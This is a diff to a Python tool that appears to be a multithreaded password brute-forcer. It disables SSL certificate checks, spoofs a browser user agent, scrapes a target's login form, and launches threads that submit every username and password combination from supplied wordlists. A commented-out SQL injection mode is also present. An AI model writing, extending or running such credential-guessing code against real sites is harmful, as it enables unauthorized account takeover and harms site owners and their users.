@@ -29,15 +29,17 @@ else:
 	ssl._create_default_https_context = _create_unverified_https_context
 ########################## End ssl
 
-def main(setTargetURL, setOptions, setMode, setRunOptions):
+def main(optionURL, setOptions, setMode, setRunOptions):
 	
-	"""
-	if setUserlist and setPasslist is file (actions.fload())
-	do httpbrute(setUserlist.readlines(), setPasslist.readlines(),) is very good for threading
-	#BUG:
-	setUserlist, setPasslist = setUserlist.readlines(), setPasslist.readlines() does not work
-	#Testing with list
-	"""
+
+	def do_job(jobs):
+		for job in jobs:
+			job.daemon = True
+			job.start()
+			
+		for job in jobs:
+			job.join()
+	
 	# BUG
 	"""
 		Setting threading with big number
@@ -45,12 +47,13 @@ def main(setTargetURL, setOptions, setMode, setRunOptions):
 		Memory management
 	"""
 	
-	setUserlist, setThreads, setKeyFalse, setPasslist = setOptions.values()
+	optionUserlist, optionThreads, optionKeyFalse, optionPasslist = setOptions.values()
+	optionProxy, optionLog, optionVerbose = setRunOptions.values()
 	#setProxy, setVerbose, setLog = setRunOptions.values()
 
 	# try:
-	# 	sizePasslist = actions.size_o(setPasslist)
-	# 	sizeUserlist = actions.size_o(setUserlist)
+	# 	sizePasslist = actions.size_o(optionPasslist)
+	# 	sizeUserlist = actions.size_o(optionUserlist)
 	# 	# TODO Check condition each case
 	# 
 	# except:
@@ -58,39 +61,88 @@ def main(setTargetURL, setOptions, setMode, setRunOptions):
 	# 	pass
 		
 	try:
-		setUserlist = setUserlist.split("\n")
+		optionUserlist = optionUserlist.split("\n")
 	except:
-		#setUserlist = setUserlist.readlines()
+		#optionUserlist = optionUserlist.readlines()
 		pass
 
 	# TODO Must testing cases with list and file object
 	try:
-		setPasslist = setPasslist.split("\n")
+		optionPasslist = optionPasslist.split("\n")
 	except:
 		pass
 	
 	
 	## End of testing
 	
-	# TODO: check network, form before creating tasks
-
 	timeStarting = time.time()
 
-	try:
+	# get login form info 
+	# call brute
 		
-		#TODO modify for sql injection mode
-		if setMode == "--sqli":
-			pass
-			# for i in xrange(setThreads):
-			# 	worker = threading.Thread(
-			# 		target = sqltest.handle,
-			# 		args = (setTargetURL, setUserlist, setPasslist, sizeUserlist * sizePasslist, setProxy, setKeyFalse)
-			# 	)
-			# 	# add threads to list
-			# 	workers.append(worker)
-		else:
-			#httpbrute.handle(setTargetURL, setUserlist, setPasslist, sizePasslist, setProxy, setKeyFalse)
-			httpbrute.handle(setTargetURL, setUserlist, setPasslist, setKeyFalse, setThreads, setRunOptions)
+	
+	
+	sizePasslist = actions.size_o(optionPasslist)
+	sizeUserlist = actions.size_o(optionUserlist)
+
+	proc = tbrowser.startBrowser()
+	proc.addheaders = [('User-Agent', tbrowser.useragent())]
+
+
+	try:
+		utils.printf("Checking connection...")
+		proc.open(optionURL)
+		#TODO PROXY
+		loginInfo = tbrowser.getLoginForm(optionURL, proc)
+		utils.printf("Connection success! Starting attack.")
+
+	except Exception as err:
+		utils.die("Error while parsing login form", err)
+
+	finally:
+		proc.close()
+	
+	workers = []
+	trying = 0
+	
+	try:
+		for password in optionPasslist:
+			for username in optionUserlist:
+				trying += 1
+				
+				if len(workers) == optionThreads:
+					do_job(workers)
+					del workers[:]
+
+				worker = threading.Thread(
+					target = httpbrute.submit,
+					args = (
+						optionURL, username.replace("\n", ""), password.replace("\n", ""), sizeUserlist * sizePasslist,
+						optionProxy, optionKeyFalse, optionVerbose, optionLog,
+						loginInfo, trying
+					)
+				)
+				workers.append(worker)
+		
+		#DO ALL LAST TASKs
+		for worker in workers:
+			do_job(workers)
+			del workers[:]
+	# try:
+	# 
+	# 	#TODO modify for sql injection mode
+	# 	if setMode == "--sqli":
+	# 		pass
+	# 		# for i in xrange(optionThreads):
+	# 		# 	worker = threading.Thread(
+	# 		# 		target = sqltest.handle,
+	# 		# 		args = (optionURL, optionUserlist, optionPasslist, sizeUserlist * sizePasslist, setProxy, optionKeyFalse)
+	# 		# 	)
+	# 		# 	# add threads to list
+	# 		# 	workers.append(worker)
+	# 	else:
+	# 		#httpbrute.handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxy, optionKeyFalse)
+	# 		httpbrute.handle(optionURL, optionUserlist, optionPasslist, optionKeyFalse, optionThreads, setRunOptions)
 
 	except KeyboardInterrupt:# as error:
 		# for worker in workers:
@@ -130,11 +182,11 @@ def main(setTargetURL, setOptions, setMode, setRunOptions):
 		########################################
 
 		try:
-			setPasslist.close()
+			optionPasslist.close()
 		except:
 			pass
 		try:
-			setUserlist.close()
+			optionUserlist.close()
 		except:
 			pass
 
